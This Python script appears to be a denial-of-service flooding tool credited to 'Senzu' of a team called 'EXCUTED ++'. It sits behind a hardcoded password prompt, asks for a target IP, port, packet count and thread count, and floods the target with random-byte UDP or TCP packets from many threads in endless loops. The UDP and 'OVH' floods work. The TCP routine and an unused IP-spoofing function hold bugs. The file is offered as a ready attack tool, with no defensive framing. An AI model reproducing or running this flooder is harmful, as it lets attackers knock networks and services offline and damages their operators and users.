import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
import codecs

print("""\033[32m
             ▄▄▄ ▄▄▄
            █████████  
             ▀█████▀
               ▀█▀
""")
time.sleep(1.5)
print("\033[37m   Welcome To Tools By - EXCUTED ++ [\033[32m!\033[32m]")
time.sleep(1.5)
password =str(input("\033[37m[!] \033[32mPassword : \033[32m"))
time.sleep(1.5)
print("\033[37mWaittt [\033[32m!\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37mCorrect [\033[32m•\033[37m]")
time.sleep(0.5)
os.system("clear")
print("\033[37mCorrect [\033[32m••\033[37m]")
time.sleep(0.5)
os.system("clear")
print("\033[37mCorrect [\033[32m•••\033[37m]")
time.sleep(0.5)
os.system("clear")
print("\033[37mCorrect [\033[32m•\033[37m]")
time.sleep(0.5)
os.system("clear")
print("\033[37mCorrect [\033[32m••\033[37m]")
time.sleep(0.5)
os.system("clear")
print("\033[37mCorrect [\033[32m•••\033[37m]")
time.sleep(0.5)
os.system("clear")
if password == "EXCUTED-Tools":
	print("\033[37mSuccess [\033[32m√\033[37m]")
	time.sleep(2.5)
else:
	print("\033[37mWrong Password [\033[31m×\033[37m]")
	exit()
	
os.system("clear")
print("\033[37mAuthor : \033[32mSenzu")
time.sleep(3)
print("\033[37mTeam : \033[32mΣXCUTED ++")
time.sleep(3)
print("\033[37mReady [\033[32m!\033[37m]")
time.sleep(5)
os.system("clear")

print("""\033[32m

\033[93m                         ╔═╗═╗ ╦╔═╗╦ \033[35m╦╔╦╗╔═╗╔╦╗  
\033[93m                         ║╣ ╔╩╦╝║  ║ ║ \033[35m║ ║╣  ║║  
\033[93m                         ╚═╝╩ ╚═╚═╝╚═\033[35m╝ ╩ ╚═╝═╩╝  


               \033[35mAuthor : \033[37mSenzu ΣX 
               \033[35mTeam : \033[37mΣXCUTED ++
               \033[35mMethods : \033[37mUDP - OVH - TCP
               """)
         
choice =str(input("\033[35m[\033[37m!\033[35m] Methods ? \033[32m"))
ip =str(input("\033[35m[\033[37m!\033[35m] Ip Target ? \033[32m"))
port =int(input("\033[35m[\033[37m!\033[35m] Port Target ? \033[32m"))
times =int(input("\033[35m[\033[37m!\033[35m] Packets ? \033[32m"))
threads =int(input("\033[35m[\033[37m!\033[35m] Threads ? \033[32m"))
os.system("clear")

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4]
    return assemebled
    
def udp():
	data = random._urandom(4096)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[93mPackets From Team EXCUTED ++ Attack To Ip: \033[93m{} \033[37mPort : \033[93m{} \033[93mMethods: \033[93mUDP \033[37m!!!".format(ip,port))
		except:
			print("\033[93mPackets From Team EXCUTED ++ To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mUDP \033[93m!!!".format(ip,port))
			
def ovh():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[93mPackets From Team EXCUTED ++ Attack To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mOVH \033[93m!!!".format(ip,port))
		except:
			print("\033[93mPackets From Team EXCUTED ++ To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mOVH \033[37m!!!".format(ip,port))
			
def ovh2():
	data = random._urandom(10000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[93mPackets From Team EXCUTED ++ Attack To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mOVH \033[93m!!!".format(ip,port))
		except:
			print("\033[93mPackets From Team EXCUTED ++ To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mOVH \033[93m!!!".format(ip,port))

def tcp():
	data = random._urandom(4096)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.sendto(data,addr)
				print("\033[93mPackets From Team EXCUTED ++ Attack To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mTCP \033[93m!!!".format(ip,port))
		except:
			s.close()
			print("\033[37mPackets From Team EXCUTED ++ To Ip: \033[93m{} \033[93mPort : \033[93m{} \033[93mMethods: \033[93mTCP \033[93m!!!".format(ip,port))
			
for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()
		th = threading.Thread(target = ovh2)
		th.start()
	else:
		if choice == 'UDP':
			th = threading.Thread(target = udp)
			th.start()
	if choice == 'TCP':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'OVH':
		th = threading.Thread(target = ovh)
		th.start()
		th = threading.Thread(target = ovh2)
		th.start()